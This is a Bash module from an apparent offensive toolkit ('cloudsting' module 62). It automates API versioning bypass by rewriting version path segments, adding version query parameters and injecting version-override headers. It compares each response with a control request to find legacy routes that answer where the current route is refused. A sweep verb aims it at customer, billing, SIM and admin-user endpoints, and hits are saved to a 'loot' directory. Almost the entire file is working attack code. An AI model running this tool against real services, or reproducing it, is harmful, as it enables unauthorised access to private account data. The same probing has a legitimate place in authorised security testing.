#!/usr/bin/env bash
# 62_version_bypass.sh — cloudsting module 62: the old door the new lock forgot
# Verbs: --matrix | --sweep | --compare | --probe | --versions | --headers | --normalise | --list | --status-tsv | --menu | --selftest | --help
set -u
umask 077

# The root is derived from this file only after the core is sourced. Clear any
# inherited value first: a caller that itself sources the core would otherwise
# hand this module *its* directory, and the module would read its own name as
# a path.
unset CS_MOD_DIR

MODULE_ID="62_version_bypass"
MOD_NAME="API Versioning Bypass (old version, new lock)"
MOD_VERSION="1.0.0"
# shellcheck source=../data/lib/core.sh
source "$(dirname "${BASH_SOURCE[0]}")/../data/lib/core.sh"

MOD_DIR="$CS_MOD_DIR"
export MOD_DIR

VB_RUN_ID="$CS_RUN_ID"
export VB_RUN_ID
RUN_ID="$CS_RUN_ID"
export RUN_ID

OUT_DIR="$CS_LOOT/version_bypass"
mkdir -p "$OUT_DIR" 2>/dev/null || true

HIT_FILE="$OUT_DIR/hits-$RUN_ID.tsv"
PROBE_FILE="$OUT_DIR/probe-$RUN_ID.tsv"

: "${VB_TIMEOUT:=8}"
: "${VB_FOLLOW:=0}"
: "${VB_UA:=Mozilla/5.0 (X11; Linux x86_64) cloudsting/62}"

vb_log() { printf '[%s] %s\n' "$MODULE_ID" "$*" >&2; }

# ── the ways a version is named ──────────────────────────────────
# A portal ships /v1 unauthenticated beside an authenticated /v2 and never
# thinks about it again. These are the spellings that survive a rewrite:
# path segments, a query parameter, and the six headers that are honoured
# somewhere in the stack.
#   <kind>\t<name>\t<applies-to>
vb_versions() {
    cat <<'VERS'
path	v1	replace a version segment
path	v2	replace a version segment
path	v3	replace a version segment
path	v0	replace a version segment
path	v1.0	replace a version segment
path	v2.0	replace a version segment
path	v1.1	replace a version segment
path	1	replace a version segment
path	2	replace a version segment
path	V1	replace a version segment
path	v1beta1	replace a version segment
path	v2beta1	replace a version segment
path	v1alpha	replace a version segment
path	old	replace a version segment
path	legacy	replace a version segment
path	internal	replace a version segment
path	beta	replace a version segment
path	preview	replace a version segment
path	dev	replace a version segment
path	draft	replace a version segment
query	api-version	append as a query parameter
query	version	append as a query parameter
query	v	append as a query parameter
query	apiVersion	append as a query parameter
query	ver	append as a query parameter
query	api_version	append as a query parameter
header	X-Api-Version	sent as a header
header	X-Api-Version-Override	sent as a header
header	X-API-Version	sent as a header
header	X-Version	sent as a header
header	Api-Version	sent as a header
header	Accept-Version	sent as a header
header	X-Accept-Version	sent as a header
header	X-Requested-With	sent as a header
VERS
}

# The header values that make a gateway route somewhere else.
vb_header_values() {
    cat <<'VALS'
1
2
3
0
v1
v2
*
latest
default
internal
beta
preview
VALS
}

# ── normalising the path ─────────────────────────────────────────
# Every version segment already in a url is a candidate to rewrite. A url with
# none gets one inserted at the first path position, because that is where a
# gateway looks.
#   vb_slots <path> -> every candidate path, one per version
vb_slots() {
    local path="$1"
    local -a segs
    IFS='/' read -r -a segs <<< "${path#/}"

    local -a out_paths=()
    local i seg replaced=0 placed=0
    for i in "${!segs[@]}"; do
        seg="${segs[$i]}"
        if [[ "$seg" =~ ^[vV]?[0-9]+(\.[0-9]+)?(beta[0-9]*|alpha[0-9]*)?$ ]]; then
            # a version lives at this position: rewrite it with everything else
            local v
            while IFS= read -r v; do
                [[ -z "$v" ]] && continue
                local -a copy=("${segs[@]}")
                copy[$i]="$v"
                printf '/%s\n' "$(IFS=/; echo "${copy[*]}")"
            done < <(vb_versions | awk -F'\t' '$1=="path"{print $2}')
            replaced=$((replaced + 1))
        fi
    done

    if (( replaced == 0 )); then
        # no version in the path: insert one after the first segment (the
        # service name), which is where every gateway rewrite expects it
        local insert_at=1
        (( ${#segs[@]} == 0 )) && insert_at=0
        local v
        while IFS= read -r v; do
            [[ -z "$v" ]] && continue
            local -a copy=()
            local j
            for j in "${!segs[@]}"; do
                if (( j == insert_at )); then copy+=("$v"); fi
                copy+=("${segs[$j]}")
            done
            (( ${#segs[@]} == 0 )) && copy=("$v")
            printf '/%s\n' "$(IFS=/; echo "${copy[*]}")"
        done < <(vb_versions | awk -F'\t' '$1=="path"{print $2}')
        placed=1
    fi
    return 0
}

# ── transport ────────────────────────────────────────────────────
#   vb_get <url> [headers-array-name] [token]
#     -> code \x1f bytes \x1f hash \x1f keys \x1f body-path
vb_get() {
    local url="$1" token="${2:-}"
    local body; body="$(mktemp "$CS_SCRATCH/vb.XXXXXX")" 2>/dev/null || body="$OUT_DIR/.vb.$$"
    local -a args=(--silent --show-error --max-time "$VB_TIMEOUT"
                   --write-out '%{http_code}\t%{size_download}' --output "$body"
                   -A "$VB_UA" -H 'Accept: application/json, */*')
    [[ "$VB_FOLLOW" == "1" ]] && args+=(-L)
    [[ -n "$token" ]] && args+=(-H "Authorization: Bearer $token")
    local h
    for h in "${VB_HDRS[@]:-}"; do
        [[ -n "$h" ]] && args+=(-H "$h")
    done
    local meta code len
    meta="$(curl "${args[@]}" "$url" 2>/dev/null)" || meta=""
    case "$meta" in
        [0-9][0-9][0-9]$'\t'*) IFS=$'\t' read -r code len <<<"$meta" ;;
        *) code="000"; len=0 ;;
    esac
    [[ -s "$body" ]] || : > "$body" 2>/dev/null || true

    local keys="" hash
    if head -c 1 "$body" 2>/dev/null | grep -q '[{\[]'; then
        keys="$(jq -r 'if type=="object" then (keys_unsorted|join(","))
                       elif type=="array" then "array:"+(length|tostring)
                       else "scalar" end' "$body" 2>/dev/null | head -c 400)"
    fi
    hash="$(cs_fingerprint "$(cat "$body" 2>/dev/null)")"
    printf '%s\037%s\037%s\037%s\037%s\n' "${code:-000}" "${len:-0}" "$hash" "$keys" "$body"
}

# ── verdict ──────────────────────────────────────────────────────
# The bypass is not "the old path answers". It is "the old path answers what
# the new path refused". Three states matter:
#   refused-now    the canonical path says 401/403
#   open-here      a rewritten path says 2xx and returns structure
#   same-as-now    a rewritten path returns the same bytes as the canonical one
#   caught-by-gateway  the rewritten path is refused too (good news)
#   absent         no such route
#   error-differs  a 500 on the old path is still information
#   vb_verdict <canonical-code> <code> <hash> <keys> <canonical-hash> <canonical-keys>
vb_verdict() {
    local c_code="$1" code="$2" hash="$3" keys="$4" c_hash="$5" c_keys="$6"

    case "$code" in
        000) printf 'unreachable\tno-answer\t'; return ;;
        404|410) printf 'absent\tno-such-route\t'; return ;;
        401|403) printf 'caught-by-gateway\trefused\t'; return ;;
        5*) printf 'error-differs\tserver-error\t'; return ;;
        400|422) printf 'rejected\tvalidation\t'; return ;;
    esac
    # the rewritten path is a 2xx or a redirect
    case "$c_code" in
        401|403)
            # the canonical path is locked and this one is not — the whole point
            if [[ -n "$keys" && "$keys" != "scalar" ]]; then
                printf 'open-here\tresponse-structure\t'
            else
                printf 'open-here\tno-structure\t'
            fi
            return ;;
    esac
    if [[ -n "$c_hash" && "$hash" == "$c_hash" ]]; then
        printf 'same-as-now\tidentical-bytes\t'; return
    fi
    if [[ -n "$keys" && -n "$c_keys" && "$keys" != "$c_keys" ]]; then
        printf 'differs\tother-structure\t'; return
    fi
    printf 'answers\tsame-shape\t'
}

# ── verbs ────────────────────────────────────────────────────────
# --matrix <url> — every version spelling against one endpoint, plus the
# canonical control. One endpoint, the full grid.
vb_cmd_matrix() {
    local url="${1:-}" token="${2:-}"
    [[ -z "$url" ]] && { vb_log "usage: --matrix <endpoint-url> [token]"; return 2; }
    [[ "$url" == http*://* ]] || url="https://$url"

    local scheme_host path
    scheme_host="$(printf '%s' "$url" | sed -E 's#^([a-z]+://[^/]+).*#\1#')"
    path="$(printf '%s' "$url" | sed -E 's#^[a-z]+://[^/]+##')"
    [[ -z "$path" ]] && path="/"

    # control: the url as handed in, no version header
    VB_HDRS=()
    local c_code c_len c_hash c_keys c_body
    cs_split "$(vb_get "$url" "$token")" c_code c_len c_hash c_keys c_body
    rm -f "$c_body"
    cs_row CONTROL "$url" "code=$c_code" "bytes=$c_len"
    printf 'control\t-\t%s\t%s\t-\n' "$c_code" "canonical" >> "$PROBE_FILE"

    local tried=0 hits=0 p n
    while IFS= read -r p; do
        [[ -z "$p" ]] && continue
        local full="${scheme_host}${p}"
        VB_HDRS=()
        cs_split "$(vb_get "$full" "$token")" n _p _q _r c_body
        local v; v="$(vb_verdict "$c_code" "$n" "$_q" "$_r" "$c_hash" "$c_keys")"
        local sig; sig="$(printf '%s' "$v" | cut -f1)"
        tried=$((tried + 1))
        printf 'path\t%s\t%s\t%s\n' "$p" "$n" "$sig" >> "$PROBE_FILE"
        case "$sig" in
            open-here)
                hits=$((hits + 1))
                cs_row OPEN "path:$p" "code=$n" "canonical=$c_code" "$(printf '%s' "$v" | cut -f2)"
                printf '%s\t%s\t%s\n' "$path" "$p" "$n" >> "$HIT_FILE"
                cs_findings_row "$MODULE_ID" "WEBAPI" "$url" "CRITICAL" "version-bypass-path" \
                    "$p answers $n while the canonical path answers $c_code"
                ;;
            differs|answers|same-as-now)
                cs_row VERSION "path:$p" "code=$n" "$sig" ;; 
        esac
        rm -f "$c_body"
    done < <(vb_slots "$path")

    # query-parameter versions
    local qname
    while IFS=$'\t' read -r _ qname _x; do
        [[ -z "$qname" ]] && continue
        local full sep
        case "$url" in *\?*) sep="&" ;; *) sep="?" ;; esac
        full="${url}${sep}${qname}=1"
        VB_HDRS=()
        local n2 b2 h2 k2 body2
        cs_split "$(vb_get "$full" "$token")" n2 b2 h2 k2 body2
        local v2; v2="$(vb_verdict "$c_code" "$n2" "$h2" "$k2" "$c_hash" "$c_keys")"
        local s2; s2="$(printf '%s' "$v2" | cut -f1)"
        tried=$((tried + 1))
        case "$s2" in
            open-here)
                hits=$((hits + 1))
                cs_row OPEN "query:$qname" "code=$n2" "canonical=$c_code" ;;
            *) cs_row VERSION "query:$qname" "code=$n2" "$s2" ;;
        esac
        rm -f "$body2"
    done < <(vb_versions | awk -F'\t' '$1=="query"')

    # header versions, one value sweep on the two that matter
    local hname hval
    while IFS=$'\t' read -r _ hname _x; do
        [[ -z "$hname" ]] && continue
        while IFS= read -r hval; do
            [[ -z "$hval" ]] && continue
            VB_HDRS=("$hname: $hval")
            local n3 b3 h3 k3 body3
            cs_split "$(vb_get "$url" "$token")" n3 b3 h3 k3 body3
            local v3; v3="$(vb_verdict "$c_code" "$n3" "$h3" "$k3" "$c_hash" "$c_keys")"
            local s3; s3="$(printf '%s' "$v3" | cut -f1)"
            tried=$((tried + 1))
            case "$s3" in
                open-here)
                    hits=$((hits + 1))
                    cs_row OPEN "header:$hname=$hval" "code=$n3" "canonical=$c_code" ;;
                differs)
                    cs_row VERSION "header:$hname=$hval" "code=$n3" "$s3" ;;
            esac
            rm -f "$body3"
        done < <(vb_header_values)
    done < <(vb_versions | awk -F'\t' '$1=="header"')

    VB_HDRS=()
    cs_row SUMMARY "tried=$tried open=$hits" "control=$c_code"
    cs_row ARTIFACT "$PROBE_FILE" "$HIT_FILE"
    (( hits > 0 )) && return 0 || return 1
}

# --compare <url> — two paths, side by side. The manual version of --matrix,
# for when the operator already knows the pair.
vb_cmd_compare() {
    local a="${1:-}" b="${2:-}" token="${3:-}"
    [[ -z "$a" || -z "$b" ]] && { vb_log "usage: --compare <path-a-url> <path-b-url> [token]"; return 2; }
    local ca la ha ka ba cb lb hb kb bb
    VB_HDRS=()
    cs_split "$(vb_get "$a" "$token")" ca la ha ka ba
    cs_split "$(vb_get "$b" "$token")" cb lb hb kb bb
    cs_row A "$a" "code=$ca" "bytes=$la" "keys=$ka"
    cs_row B "$b" "code=$cb" "bytes=$lb" "keys=$kb"
    local access_meaning
    case "${ca}:${cb}" in
        401:200|403:200|401:201|403:201) access_meaning="bypass — the second path is open while the first is refused" ;;
        200:200) access_meaning="both-answer" ;;
        401:401|403:403) access_meaning="both-refused" ;;
        *) access_meaning="inconclusive" ;;
    esac
    cs_row VERDICT "$access_meaning" "hash_equal=$([[ "$ha" == "$hb" ]] && echo yes || echo no)"
    rm -f "$ba" "$bb"
    [[ "$access_meaning" == bypass* ]] && return 0 || return 1
}

# --sweep <base> — the version matrix across the endpoints a portal is known
# to protect, so one call covers the shape end to end.
vb_cmd_sweep() {
    local base="${1:-}" token="${2:-}"
    [[ -z "$base" ]] && { vb_log "usage: --sweep <base-url> [token]"; return 2; }
    [[ "$base" == http*://* ]] || base="https://$base"

    local path what tried=0 hits=0
    for path in /api/v1/customer/me /api/v1/subscriber /api/v1/billing/invoice \
                /api/v1/account/balance /api/v1/admin/users /api/v1/sim \
                /api/customer /api/subscriber /api/billing ; do
        local url="${base%/}$path"
        local n; n="$(vb_cmd_matrix "$url" "$token" 2>/dev/null | awk -F'\t' '$1=="SUMMARY"{print $2}' | sed 's/open=//')"
        local t; t="$(vb_cmd_matrix "$url" "$token" 2>/dev/null | awk -F'\t' '$1=="SUMMARY"{print $2}' | sed 's/tried=//; s/ open.*//')"
        [[ -z "$n" ]] && continue
        tried=$((tried + ${t:-0}))
        hits=$((hits + n))
        cs_row ENDPOINT "$path" "tried=${t:-0}" "open=$n"
    done
    cs_row SUMMARY "tried=$tried open=$hits"
    (( hits > 0 )) && return 0 || return 1
}

# --probe <url> <version-path> — one rewrite, one line.
vb_cmd_probe() {
    local url="${1:-}" alt="${2:-}" token="${3:-}"
    [[ -z "$url" || -z "$alt" ]] && { vb_log "usage: --probe <canonical-url> <alternate-path-or-full-url> [token]"; return 2; }
    local scheme_host; scheme_host="$(printf '%s' "$url" | sed -E 's#^([a-z]+://[^/]+).*#\1#')"
    local full="$alt"
    [[ "$alt" == /* ]] && full="${scheme_host}${alt}"

    VB_HDRS=()
    local c_code c_len c_hash c_keys c_body p_code p_len p_hash p_keys p_body
    cs_split "$(vb_get "$url" "$token")" c_code c_len c_hash c_keys c_body
    cs_split "$(vb_get "$full" "$token")" p_code p_len p_hash p_keys p_body
    local v; v="$(vb_verdict "$c_code" "$p_code" "$p_hash" "$p_keys" "$c_hash" "$c_keys")"
    cs_row PROBE "$full" "code=$p_code" "canonical=$c_code" "verdict=$(printf '%s' "$v" | cut -f1)"
    rm -f "$c_body" "$p_body"
    [[ "$(printf '%s' "$v" | cut -f1)" == "open-here" ]] && return 0 || return 1
}

vb_cmd_versions() {
    local kind name note
    while IFS=$'\t' read -r kind name note; do
        [[ -z "$kind" ]] && continue
        cs_row VERSION "$name" "kind=$kind" "$note"
    done < <(vb_versions)
    return 0
}

vb_cmd_headers() {
    local kind name note
    while IFS=$'\t' read -r kind name note; do
        [[ "$kind" != "header" ]] && continue
        cs_row HEADER "$name" "$note"
    done < <(vb_versions)
    local v
    while IFS= read -r v; do
        [[ -z "$v" ]] && continue
        cs_row VALUE "$v"
    done < <(vb_header_values)
    return 0
}

# --normalise <path> — what the module would try, without sending anything.
vb_cmd_normalise() {
    local path="${1:-}"
    [[ -z "$path" ]] && { vb_log "usage: --normalise <path>"; return 2; }
    local n=0 p
    while IFS= read -r p; do
        [[ -z "$p" ]] && continue
        n=$((n + 1))
        cs_row CANDIDATE "$p"
    done < <(vb_slots "$path")
    cs_row SUMMARY "candidates=$n"
    (( n > 0 )) && return 0 || return 1
}

vb_cmd_list() {
    vb_cmd_versions
    return 0
}

vb_cmd_status_tsv() {
    local curl_state
    command -v curl >/dev/null 2>&1 && curl_state="ok" || curl_state="missing"
    printf '%s\t%s\tcurl-%s\tversions-%s\theaders-%s\n' \
        "$MODULE_ID" "$MOD_NAME" "$curl_state" \
        "$(vb_versions | wc -l | tr -d ' ')" \
        "$(vb_versions | awk -F'\t' '$1=="header"{c++} END{print c+0}')"
}

vb_cmd_menu() { printf 'menu\t%s\t[%s] %s\n' "$MODULE_ID" "$MOD_VERSION" "$MOD_NAME"; }

vb_cmd_help() {
    cat <<'HELP'
cloudsting module 62 — API Versioning Bypass v1.0.0
  --matrix <url> [token]            every version spelling against one endpoint
  --sweep <base> [token]            the matrix across a portal's protected paths
  --compare <url-a> <url-b> [token] two paths side by side (v1 unlocked, v2 locked)
  --probe <url> <alt> [token]       one rewrite, one line
  --normalise <path>                what would be tried, without sending
  --versions | --headers            the spelling and header tables
  --list | --status-tsv | --menu | --selftest | --help

The bypass is not "the old path answers" — it is "the old path answers what the
new path refused". --matrix always sends a control request to the url as handed
in and compares: open-here only fires when the canonical path is 401/403 and a
rewritten path is 2xx with response structure.

20 path spellings, 6 query parameters, 8 headers × 12 values.

Environment: VB_TIMEOUT (8), VB_FOLLOW (0), VB_UA
HELP
}

# ── Selftest ─────────────────────────────────────────────────────
vb_selftest() {
    cs_selftest_reset

    chk versions-many  "$( (( $(vb_versions | wc -l) >= 30 )) && echo many || echo few )" "many"
    chk versions-3col  "$(vb_versions | awk -F'\t' 'NF!=3{c++} END{print c+0}')" "0"
    chk versions-path  "$(vb_versions | awk -F'\t' '$1=="path"{c++} END{print c+0}')" "20"
    chk versions-query "$(vb_versions | awk -F'\t' '$1=="query"{c++} END{print c+0}')" "6"
    chk versions-hdr   "$(vb_versions | awk -F'\t' '$1=="header"{c++} END{print c+0}')" "8"
    chk values-many    "$( (( $(vb_header_values | wc -l) >= 10 )) && echo many || echo few )" "many"

    # slot rewriting: an existing version segment is replaced in place
    local out; out="$(vb_slots /api/v2/customer)"
    chk slots-count    "$(printf '%s\n' "$out" | grep -c '^/api/')" "20"
    chk slots-v1       "$(printf '%s\n' "$out" | grep -cx '/api/v1/customer')" "1"
    chk slots-legacy   "$(printf '%s\n' "$out" | grep -cx '/api/legacy/customer')" "1"
    chk slots-keeps    "$(printf '%s\n' "$out" | grep -c '/api/v2/customer$')" "1"

    # a path with no version gets one inserted after the service name
    out="$(vb_slots /api/customer/1)"
    # insert-after-the-service-name: /api/customer/1 -> /api/customer/v1
    chk slots-insert   "$(printf '%s\n' "$out" | grep -cx '/api/customer/v1')" "1"
    chk slots-insert2  "$(printf '%s\n' "$out" | grep -cx '/api/customer/legacy')" "1"

    # a numeric segment is a version slot
    out="$(vb_slots /api/1/customer)"
    chk slots-numeric  "$(printf '%s\n' "$out" | grep -cx '/api/v3/customer')" "1"

    # verdicts, one per state
    chk v-open       "$(vb_verdict 401 200 abc 'a,b' zzz 'c' | cut -f1)" "open-here"
    chk v-open-sig   "$(vb_verdict 401 200 abc 'a,b' zzz 'c' | cut -f2)" "response-structure"
    chk v-open-nostr "$(vb_verdict 403 200 abc 'scalar' zzz 'c' | cut -f2)" "no-structure"
    chk v-caught     "$(vb_verdict 401 401 abc 'a' zzz 'c' | cut -f1)" "caught-by-gateway"
    chk v-absent     "$(vb_verdict 401 404 abc 'a' zzz 'c' | cut -f1)" "absent"
    chk v-unreach    "$(vb_verdict 401 000 '' '' zzz 'c' | cut -f1)" "unreachable"
    chk v-error      "$(vb_verdict 401 500 abc 'a' zzz 'c' | cut -f1)" "error-differs"
    chk v-same       "$(vb_verdict 200 200 abc 'a,b' abc 'a,b' | cut -f1)" "same-as-now"
    chk v-differs    "$(vb_verdict 200 200 abc 'x,y' zzz 'a,b' | cut -f1)" "differs"
    chk v-answers    "$(vb_verdict 200 200 abc 'a,b' zzz 'a,b' | cut -f1)" "answers"

    # normalise is the dry run and says how much it would try
    out="$(vb_cmd_normalise /api/v2/x 2>/dev/null)"
    chk normalise-n  "$(printf '%s' "$out" | awk -F'\t' '$1=="SUMMARY"{print $2}')" "candidates=20"
    vb_cmd_normalise "" >/dev/null 2>&1; chk normalise-usage "$?" "2"

    # a dead host: control unreachable, nothing open, nonzero exit
    VB_TIMEOUT=1
    out="$(vb_cmd_matrix http://127.0.0.1:9/api/v2/x 2>/dev/null)"
    chk dead-control "$(printf '%s' "$out" | awk -F'\t' '$1=="CONTROL"{print $3}')" "code=000"
    chk dead-open    "$(printf '%s' "$out" | awk -F'\t' '$1=="SUMMARY"{print $2}' | sed 's/.* //')" "open=0"
    vb_cmd_matrix http://127.0.0.1:9/api/v2/x >/dev/null 2>&1
    chk dead-rc      "$?" "1"

    # usage errors, not crashes
    vb_cmd_matrix 2>/dev/null;  chk matrix-usage "$?" "2"
    vb_cmd_compare 2>/dev/null; chk compare-usage "$?" "2"
    vb_cmd_probe 2>/dev/null;   chk probe-usage  "$?" "2"
    vb_cmd_sweep 2>/dev/null;   chk sweep-usage  "$?" "2"

    # shape contracts
    chk status-fields "$(vb_cmd_status_tsv | awk -F'\t' '{print NF}')" "5"
    chk status-module "$(vb_cmd_status_tsv | awk -F'\t' '{print $1}')" "$MODULE_ID"
    chk menu-fields   "$(vb_cmd_menu | awk -F'\t' '{print NF}')" "3"
    chk help-first    "$(vb_cmd_help | head -1 | grep -ci 'Versioning')" "1"
    chk headers-list  "$(vb_cmd_headers 2>/dev/null | grep -c '^HEADER')" "8"
    chk headers-vals  "$(vb_cmd_headers 2>/dev/null | grep -c '^VALUE')" "12"

    cs_selftest_done
}

# ── Dispatch ─────────────────────────────────────────────────────
[ "${BASH_SOURCE[0]}" = "$0" ] || return 0
case "${1:-}" in
    --matrix)    shift; vb_cmd_matrix "$@";;
    --sweep)     shift; vb_cmd_sweep "$@";;
    --compare)   shift; vb_cmd_compare "$@";;
    --probe)     shift; vb_cmd_probe "$@";;
    --normalise|--normalize) shift; vb_cmd_normalise "$@";;
    --versions)  vb_cmd_versions;;
    --headers)   vb_cmd_headers;;
    --list)      vb_cmd_list;;
    --status-tsv|--status) vb_cmd_status_tsv;;
    --menu)      vb_cmd_menu;;
    --selftest)  vb_selftest;;
    *)           vb_cmd_help;;
esac
